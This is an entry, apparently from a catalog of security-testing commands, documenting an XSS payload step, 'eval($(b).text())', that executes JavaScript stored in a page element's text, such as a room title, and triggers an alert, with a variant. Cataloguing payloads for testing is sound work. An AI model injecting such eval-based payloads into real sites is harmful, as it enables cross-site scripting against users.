---
id: cmd-eval-jquery-text-2024
data: eval($(b).text())
tags:
  - xss
  - eval
  - jquery
type: command
output: 'Executes the JavaScript code from the room title, triggering the alert'
executor: javascript
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.450Z'
verified: false
validated: true
submitted: true
---
# eval-jquery-text

## Command

```javascript
eval($(b).text())
```

## Description

Evaluates the text content of the element referenced by variable `b` using jQuery, executing stored JavaScript from the DOM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| b | Variable holding element selector | Yes |
| $(b).text() | jQuery retrieval of text content | Yes |

## Examples

### Basic Usage

```javascript
eval($(b).text())
```

### Advanced Usage

```javascript
eval($(b).text().replace(/alert/g, 'console.log'))
```

## Expected Output

Execution of the retrieved code, e.g., alert from room title; errors if jQuery absent or variable unset.

## Related

- [[commands/set-variable-b-roomtitle]]
